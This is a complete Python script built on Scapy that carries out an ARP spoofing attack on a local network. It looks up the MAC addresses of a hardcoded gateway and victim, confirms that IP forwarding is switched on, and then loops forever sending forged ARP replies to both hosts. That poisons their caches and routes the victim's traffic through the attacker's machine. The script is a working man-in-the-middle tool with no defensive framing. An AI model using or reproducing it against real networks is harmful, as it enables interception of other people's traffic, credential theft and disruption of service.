from scapy.all import *

def getMac(ip):
    # sr is send and receive at L3, srp is send and receive at L2
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src

def arpSpoofing(gatewayip, targetip, gatewaymac, targetmac):
    while(True):
        # source ip is gateway and source mac is attacker Mac, destination ip is target ip and destination mac is target mac
        # if op is 1 that is ARP Request, if op is 2 that is ARP Reply
        send(ARP(op=2, psrc=gatewayip, pdst=targetip, hwdst=targetmac), verbose=0)
        send(ARP(op=2, psrc=targetip, pdst=gatewayip, hwdst=gatewaymac), verbose=0)

def __init__():
    with open('/proc/sys/net/ipv4/ip_forward') as f:
        if(f.read().find("0")!=-1):
            print("Please Enter the 'sudo echo 1 > /proc/sys/net/ipv4/ip_forward'")
            exit(0)

__init__()

gatewayip = "192.168.45.1"
targetip = "192.168.45.236"

gatewaymac = getMac(gatewayip)
targetmac = getMac(targetip)

arpSpoofing(gatewayip, targetip, gatewaymac, targetmac)
